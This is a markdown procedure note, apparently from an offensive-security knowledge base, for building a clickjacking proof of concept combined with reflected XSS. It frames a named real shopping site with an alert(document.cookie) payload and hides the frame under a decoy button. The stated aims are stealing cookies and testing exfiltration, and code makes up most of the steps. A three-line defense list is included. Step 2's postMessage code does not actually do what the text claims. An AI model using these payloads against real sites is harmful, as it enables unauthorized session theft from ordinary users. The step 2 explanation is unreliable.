---
tags:
  - poc
  - clickjacking
  - xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.224Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: b0aaa547-d724-4f87-b9f0-444a42388049
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Create-Clickjacking-POC-with-XSS

## Summary

This procedure develops HTML proof-of-concept files that iframe the vulnerable shop page with an XSS payload, using CSS overlays to trick user clicks into executing the script.

## Description

The POC combines clickjacking and XSS by embedding the target URL in an iframe, making it invisible or overlaid, so a user's click on a benign button triggers the XSS in the iframe context, stealing cookies.

## Requirements

1. Confirmed XSS and clickjacking
2. Text editor for HTML/CSS/JS
3. Local server or file opening capability

## Defense

Defensive measures and detection strategies:

- Implement frame protection headers
- Sanitize all reflected inputs
- Educate users on phishing via email/attachments

## Objectives

1. Build functional POC HTML files
2. Ensure automatic or click-triggered XSS
3. Test for cookie exfiltration

## Instructions

### Step 1: Create Basic POC Structure

**Context**: Set up iframe with vulnerable URL and payload.

In POC1.html:

```html
<!DOCTYPE html>
<html>
<body>
<iframe src="https://marthastewart.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E" style="opacity:0.5; width:100%; height:500px;"></iframe>
<button>Click Me</button>
</body>
</html>
```

> Adjust opacity to 0 for invisibility.

### Step 2: Add Overlay for Clickjacking

**Context**: Position elements to overlay the iframe click area.

Enhance with CSS:

```html
<style>
iframe { position:absolute; top:0; left:0; opacity:0; }
button { position:relative; z-index:1; }
</style>
<script>
document.querySelector('button').onclick = function() { document.querySelector('iframe').contentWindow.postMessage('click', '*'); };
</script>
```

> Expected output: Click on button triggers iframe interaction, executing XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- poc
- clickjacking
- xss
